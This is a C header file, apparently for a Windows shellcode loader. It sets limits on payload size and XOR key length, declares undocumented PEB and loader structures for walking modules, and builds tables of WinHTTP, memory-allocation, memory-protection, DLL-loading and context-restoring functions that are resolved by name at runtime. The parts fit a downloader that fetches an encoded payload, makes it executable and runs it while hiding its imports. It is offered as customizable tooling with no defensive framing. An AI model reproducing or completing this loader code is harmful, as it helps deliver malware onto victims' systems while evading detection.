#pragma once

// ===================================================================================
// Customizable
// ===================================================================================
#define MAX_SHELLCODE_SIZE  (20 * 1024 * 1024)
#define MAX_URL_LENGTH      2048
#define MAX_XOR_KEY_LENGTH  256

// ===================================================================================
// Preprocessor Macros and Constants
// ===================================================================================
#define STATUS_SUCCESS 0

#define NT_SUCCESS(Status)  (((NTSTATUS)(Status)) >= 0)

#define NtCurrentProcess() ((HANDLE)-1) // Return the pseudo handle for the current process
#define NtCurrentThread()  ((HANDLE)-2) // Return the pseudo handle for the current thread

// ===================================================================================
// Internal OS Structures (PEB, TEB, etc.)
// ===================================================================================
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;
typedef const UNICODE_STRING* PCUNICODE_STRING;

typedef struct _CLIENT_ID
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _LDR_DATA_TABLE_ENTRY {
    PVOID Reserved1[2];
    LIST_ENTRY InMemoryOrderLinks;
    PVOID Reserved2[2];
    PVOID DllBase;
    PVOID EntryPoint;
    PVOID Reserved3;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    BYTE Reserved1[8];
    PVOID Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    BYTE Reserved1[16];
    PVOID Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef VOID(NTAPI* PPS_POST_PROCESS_INIT_ROUTINE)(VOID);

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID Reserved4[3];
    PVOID AtlThunkSListPtr;
    PVOID Reserved5;
    ULONG Reserved6;
    PVOID Reserved7;
    ULONG Reserved8;
    ULONG AtlThunkSListPtr32;
    PVOID Reserved9[45];
    BYTE Reserved10[96];
    PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
    BYTE Reserved11[128];
    PVOID Reserved12[1];
    ULONG SessionId;
} PEB, * PPEB;

typedef struct _TEB {
    PVOID Reserved1[12];
    PPEB ProcessEnvironmentBlock;
    PVOID Reserved2[399];
    BYTE Reserved3[1952];
    PVOID TlsSlots[64];
    BYTE Reserved4[8];
    PVOID Reserved5[26];
    PVOID ReservedForOle;
    PVOID Reserved6[4];
    PVOID TlsExpansionSlots;
} TEB, * PTEB;

// ===================================================================================
// Win32 and Native API Function Pointers
// ===================================================================================

// WinHTTP
typedef HINTERNET(WINAPI* fnWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET(WINAPI* fnWinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET(WINAPI* fnWinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
typedef BOOL(WINAPI* fnWinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* fnWinHttpReceiveResponse)(HINTERNET, LPVOID);
typedef BOOL(WINAPI* fnWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* fnWinHttpCloseHandle)(HINTERNET);
typedef BOOL(WINAPI* fnWinHttpCrackUrl)(LPCWSTR, DWORD, DWORD, LPURL_COMPONENTS);

// Memory stuff
typedef PVOID(NTAPI* fnRtlAllocateHeap)(HANDLE, ULONG, SIZE_T);
typedef PVOID(NTAPI* fnRtlReAllocateHeap)(HANDLE, ULONG, PVOID, SIZE_T);
typedef BOOL(NTAPI* fnRtlFreeHeap)(HANDLE, ULONG, PVOID);

// Load and Unload DLL
typedef NTSTATUS(NTAPI* fnLdrLoadDll)(PWSTR, PULONG, PUNICODE_STRING, PVOID);
typedef NTSTATUS(NTAPI* fnLdrUnloadDll)(PVOID);

typedef NTSTATUS (NTAPI* fnNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI* fnNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

typedef VOID (NTAPI* fnRtlCaptureContext)(PCONTEXT);
typedef VOID (STDAPIVCALLTYPE* fnRtlRestoreContext)(PCONTEXT, struct _EXCEPTION_RECORD*);

// ===================================================================================
// CL Definitions
// ===================================================================================

#define CL_PLATFORM_NOT_FOUND_KHR 0xFFFFFC17

// Struct to hold all the necessary OpenCL handles
typedef struct {
    cl_context context;
    cl_command_queue queue;
    cl_program program;
    cl_kernel kernel;
    cl_platform_id platform_id;
    cl_device_id device_id;
    cl_uint num_devices;
    cl_uint num_platforms;
} OpenCL_Handles;

// ===================================================================================
// Api stuff
// ===================================================================================

typedef struct _API_TABLE {
    // Ntdll function pointers
    fnRtlAllocateHeap               RtlAllocateHeap;
    fnRtlReAllocateHeap             RtlReAllocateHeap;
    fnRtlFreeHeap                   RtlFreeHeap;

    fnNtAllocateVirtualMemory       NtAllocateVirtualMemory;
    fnNtProtectVirtualMemory        NtProtectVirtualMemory;

    fnRtlCaptureContext             RtlCaptureContext;
    fnRtlRestoreContext             RtlRestoreContext;

    fnLdrLoadDll                    LdrLoadDll;
    fnLdrUnloadDll                  LdrUnloadDll;

    // Winhttp pointers
    fnWinHttpOpen                   WinHttpOpen;
    fnWinHttpConnect                WinHttpConnect;
    fnWinHttpOpenRequest            WinHttpOpenRequest;
    fnWinHttpSendRequest            WinHttpSendRequest;
    fnWinHttpReceiveResponse        WinHttpReceiveResponse;
    fnWinHttpReadData               WinHttpReadData;
    fnWinHttpCloseHandle            WinHttpCloseHandle;
    fnWinHttpCrackUrl               WinHttpCrackUrl;
} API_TABLE, * PAPI_TABLE;

typedef struct _MODULE_TABLE {
    HMODULE Ntdll;
    HMODULE WinHttp;
} MODULE_TABLE, * PMODULE_TABLE;

typedef struct _INSTANCE {
    API_TABLE Api;
    MODULE_TABLE Modules;
} INSTANCE, * PINSTANCE;

typedef struct _API_FUNCTION {
    const char* Name;
    size_t      ApiOffset;
} API_FUNCTION, * PAPI_FUNCTION;

// Array of functions to resolve from ntdll.dll
static const API_FUNCTION g_NtdllFunctions[] = {
    { "RtlAllocateHeap", offsetof(API_TABLE, RtlAllocateHeap) },
    { "RtlReAllocateHeap", offsetof(API_TABLE, RtlReAllocateHeap) },
    { "RtlFreeHeap", offsetof(API_TABLE, RtlFreeHeap) },
    { "NtAllocateVirtualMemory", offsetof(API_TABLE, NtAllocateVirtualMemory) },
    { "NtProtectVirtualMemory", offsetof(API_TABLE, NtProtectVirtualMemory) },
    { "LdrLoadDll", offsetof(API_TABLE, LdrLoadDll) },
    { "LdrUnloadDll", offsetof(API_TABLE, LdrUnloadDll) },
};

// Array of functions to resolve from winhttp.dll
static const API_FUNCTION g_WinHttpFunctions[] = {
    { "WinHttpOpen", offsetof(API_TABLE, WinHttpOpen) },
    { "WinHttpConnect", offsetof(API_TABLE, WinHttpConnect) },
    { "WinHttpOpenRequest", offsetof(API_TABLE, WinHttpOpenRequest) },
    { "WinHttpReadData", offsetof(API_TABLE, WinHttpReadData) },
    { "WinHttpReceiveResponse", offsetof(API_TABLE, WinHttpReceiveResponse) },
    { "WinHttpSendRequest", offsetof(API_TABLE, WinHttpSendRequest) },
    { "WinHttpCloseHandle", offsetof(API_TABLE, WinHttpCloseHandle) },
    { "WinHttpCrackUrl", offsetof(API_TABLE, WinHttpCrackUrl) }
};